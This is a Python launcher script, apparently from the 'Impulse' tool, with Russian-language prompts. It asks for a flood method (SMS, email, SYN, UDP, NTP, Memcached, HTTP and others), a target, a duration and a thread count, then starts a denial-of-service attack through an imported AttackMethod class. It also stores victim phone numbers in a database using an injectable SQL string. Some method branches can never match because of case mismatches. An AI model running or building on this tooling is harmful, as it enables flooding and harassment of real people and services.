# Created by LimerBoy
# Import modules
import os
import sys
import argparse
from tools.crash import CriticalError
import tools.addons.clean
import tools.addons.logo
import tools.addons.winpcap
import sqlite3
from tools.method import AttackMethod

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))


method = input('Введите метод(SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP): ').upper()
if method == "SMS":
	con = sqlite3.connect('phone.db')
	cur = con.cursor()
	cur.execute('CREATE TABLE IF NOT EXISTS phone(number TEXT) ')
	target = input('Введите номер: ')
	if target == 'c':
		cur.execute("SELECT * FROM phone;")
		n = 0
		for i in cur.fetchall():
			print(f'{n}) ',i[0])
			n+=1
		cur.execute("SELECT * FROM phone;")
		number = int(input('Введите номер по порядку из списка: '))
		target = cur.fetchall()[number][0]
		cur.close()
		con.close()
	elif target != 'c':
		cur.execute("SELECT * FROM phone;")
		w = 0
		for i in cur.fetchall():
			if i == target:
				w = 1
		if w == 0:
			cur.execute(f'INSERT INTO phone VALUES ("{target}")')
			con.commit()
		cur.close()
		con.close()

	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "EMAIL":
	target = input('Введите Email: ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "NTP":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "SYN":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "UDP":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "POD":
	target = input('Введите адрес(IP): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "ICMP":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "HTTP":
	target = input('Введите адрес(URL): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "Slowloris":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
elif method == "Memcached":
	target = input('Введите адрес(IP:PORT): ')
	time = int(input('Введите время(в секундах): '))
	threads = int(input('Введите кол-во потоков: '))
else:
	print('Читай https://github.com/LimerBoy/Impulse')



    # Print help


    # Run ddos attack
with AttackMethod(
    duration=time, name=method, threads=threads, target=target
    ) as Flood:
    Flood.Start()
